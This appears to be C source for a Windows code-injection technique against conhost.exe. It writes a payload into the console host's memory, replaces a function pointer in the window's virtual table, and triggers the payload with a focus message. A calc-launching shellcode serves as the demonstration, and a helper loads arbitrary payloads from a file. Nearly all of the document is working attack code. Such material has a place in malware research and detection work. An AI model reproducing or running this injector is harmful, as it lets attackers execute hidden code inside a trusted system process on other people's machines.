#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

typedef struct _vftable_t {
	ULONG_PTR     EnableBothScrollBars;
	ULONG_PTR     UpdateScrollBar;
	ULONG_PTR     IsInFullscreen;
	ULONG_PTR     SetIsFullscreen;
	ULONG_PTR     SetViewportOrigin;
	ULONG_PTR     SetWindowHasMoved;
	ULONG_PTR     CaptureMouse;
	ULONG_PTR     ReleaseMouse;
	ULONG_PTR     GetWindowHandle;
	ULONG_PTR     SetOwner;
	ULONG_PTR     GetCursorPosition;
	ULONG_PTR     GetClientRectangle;
	ULONG_PTR     MapPoints;
	ULONG_PTR     ConvertScreenToClient;
	ULONG_PTR     SendNotifyBeep;
	ULONG_PTR     PostUpdateScrollBars;
	ULONG_PTR     PostUpdateTitleWithCopy;
	ULONG_PTR     PostUpdateWindowSize;
	ULONG_PTR     UpdateWindowSize;
	ULONG_PTR     UpdateWindowText;
	ULONG_PTR     HorizontalScroll;
	ULONG_PTR     VerticalScroll;
	ULONG_PTR     SignalUia;
	ULONG_PTR     UiaSetTextAreaFocus;
	ULONG_PTR     GetWindowRect;
} ConsoleWindow;

// just here for reference. it's not used here.
typedef struct _userData_t {
	ULONG_PTR vTable;     // gets replaced with new table pointer
	ULONG_PTR pUnknown;   // some undefined memory pointer
	HWND      hWnd;
	BYTE      buf[100];   // don't care
} UserData;

// given a process id for a console process, it will return 
// the process id for conhost.exe
DWORD conhostId(DWORD dwPPid) 
{
	HANDLE         hSnap;
	PROCESSENTRY32W pe32;
	DWORD          dwPid = 0;

	// create snapshot of system
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32W);

	// get first process
	if (Process32FirstW(hSnap, &pe32)) {
		do {
			// conhost?
			if (lstrcmpiW(L"conhost.exe", pe32.szExeFile) == 0) {
				// child process?
				if (pe32.th32ParentProcessID == dwPPid) {
					// return process id
					dwPid = pe32.th32ProcessID;
					break;
				}
			}
		} while (Process32NextW(hSnap, &pe32));
	}
	CloseHandle(hSnap);

	return dwPid;
}

DWORD readpic(PWCHAR path, LPVOID* pic) 
{
	HANDLE hf;
	DWORD  len, rd = 0;

	// 1. open the file
	hf = CreateFileW(path, GENERIC_READ, 0, 0,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hf != INVALID_HANDLE_VALUE) {
		// get file size
		len = GetFileSize(hf, 0);
		// allocate memory
		*pic = malloc(len + 16);
		// read file contents into memory
		ReadFile(hf, *pic, len, &rd, 0);
		CloseHandle(hf);
	}
	return rd;
}

VOID conhostInject(LPVOID payload, DWORD payloadSize)
{
	HWND          hwnd;
	LONG_PTR      udptr;
	DWORD         pid, ppid;
	SIZE_T        wr;
	HANDLE        hp;
	ConsoleWindow cw;
	LPVOID        cs, ds;
	ULONG_PTR     vTable;

	// 1. Obtain handle and process id for a console window 
	//   (this assumes one already running)
	hwnd = FindWindowW(L"ConsoleWindowClass", NULL);

	GetWindowThreadProcessId(hwnd, &ppid);

	// 2. Obtain the process id for the host process 
	pid = conhostId(ppid);

	// csrss.exe spawns conhost.exe on 32-bit windows 
	if (pid == 0) {
		printf("parent id is %ld\nunable to obtain pid of conhost.exe\n", ppid);
		return;
	}
	// 3. Open the conhost.exe process
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	// 4. Allocate RWX memory and copy the payload there
	cs = VirtualAllocEx(hp, NULL, payloadSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

	// 5. Read the address of current virtual table
	udptr = GetWindowLongPtr(hwnd, GWLP_USERDATA);
	ReadProcessMemory(hp, (LPVOID)udptr,
		(LPVOID)&vTable, sizeof(ULONG_PTR), &wr);

	// 6. Read the current virtual table into local memory
	ReadProcessMemory(hp, (LPVOID)vTable,
		(LPVOID)&cw, sizeof(ConsoleWindow), &wr);

	// 7. Allocate RW memory for the new virtual table
	ds = VirtualAllocEx(hp, NULL, sizeof(ConsoleWindow),
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// 8. update the local copy of virtual table with 
	//    address of payload and write to remote process
	cw.GetWindowHandle = (ULONG_PTR)cs;
	WriteProcessMemory(hp, ds, &cw, sizeof(ConsoleWindow), &wr);

	// 9. Update pointer to virtual table in remote process
	WriteProcessMemory(hp, (LPVOID)udptr, &ds,
		sizeof(ULONG_PTR), &wr);

	// 10. Trigger execution of the payload
	SendMessage(hwnd, WM_SETFOCUS, 0, 0);

	// 11. Restore pointer to original virtual table
	WriteProcessMemory(hp, (LPVOID)udptr, &vTable,
		sizeof(ULONG_PTR), &wr);

	// 12. Release memory and close handles
	VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

	CloseHandle(hp);
}

int ConhostInjectExecute()
{

	unsigned char shellcode[] = {
		// 构建"calc.exe"字符串到栈上
		0x48, 0x31, 0xC0,               // xor rax, rax
		0x50,                           // push rax        ; null terminator
		0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
		0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

		// 设置参数并调用
		0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
		0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
		0x5A,                           // pop rdx         ; 第二个参数

		// 调用WinExec
		0x48, 0xB8,                     // mov rax,
		0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
		0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
		0x48, 0xF7, 0xD0,               // not rax
		0xFF, 0xD0                      // call rax
	};
	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
	// 填充WinExec地址
	*(UINT64*)(shellcode + 22) = ~WinExecAddr;


	conhostInject(shellcode, sizeof(shellcode));
	return 0;
}
